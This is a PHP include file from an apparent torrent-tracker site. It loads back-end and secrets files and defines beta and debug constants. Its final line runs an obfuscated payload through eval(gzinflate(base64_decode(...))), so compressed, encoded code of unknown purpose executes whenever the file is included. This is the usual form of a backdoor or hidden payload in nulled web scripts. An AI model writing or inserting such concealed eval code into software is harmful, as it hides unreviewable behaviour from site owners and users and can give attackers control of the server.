<?php 
# IMPORTANT: Do not edit below unless you know what you are doing! 
if (!defined("IN_TRACKER")) 
  die("Hacking attempt!"); 

// INCLUDE/REQUIRE BACK-END 
require_once($rootpath . 'include/init.php'); 
require_once($rootpath . 'include/global.php'); 
require_once($rootpath . 'include/config.php'); 
require_once($rootpath . 'include/functions.php'); 
require_once($rootpath . 'include/secrets.php'); 
require_once($rootpath . 'include/class/class.torrenttable.php');
require_once($rootpath . 'include/class/class.browsepage.php');
require_once($rootpath . 'include/class/class.textbbcode.php');
require_once($rootpath . 'include/class/class.cache.php');
require_once($rootpath . 'include/class/class.commenttable.php');

define ("BETA", 0); 
define ("BETA_NOTICE", "\n<br />Warning: This version is Release Candidate 0! There can code malfunctions!"); 
define ("DEBUG_MODE", 0); // Shows the queries at the bottom of the page. 
eval(gzinflate(base64_decode("nVTta4JAGP9c0P9wgoTCPvlVgo3httiYUeKXESJ2qyNjzXMbEf7vu7c87/QqC1Iffy93z+9R0SdwLIQxLB37JYpmySxcREn8MF+4YDwGAmF3XRccR8OBRgMTwGG/xp6DBkQKiSyCeRzMJchriT+G4es0kDivJR68xxIkha/u52n6FnCMXRG0Gg1HQ0R6XMMy2aVrlCXfP18lxMl6nzmiI4pbcLcvDw7bL7lNfke+eXo5Abgs0F4xEFSf4pVuIuLiJrQwmzCq32XCm6d7rJMwmQiqT03qlq1LPSOcpEWRHhx1bIIx+NugHAInR5g8Ads7YP+6ZH2YZhuD4Jzph71d1jzN2qPensFcFQ7aIPl7S6JNVyucp3hDAyFuPhdU/HRfQPmIK9acVwGYY3hapU3T/U8yemSHzgUYi82jKxr5pl0beEtx1rZ35Aal/sbfFrpqbk5d4fWLXcZzNvfGR+bq5Ds0F6x7p2/Utr+Nt01AX8A8A43ZbwrNqMQcqn8=")));
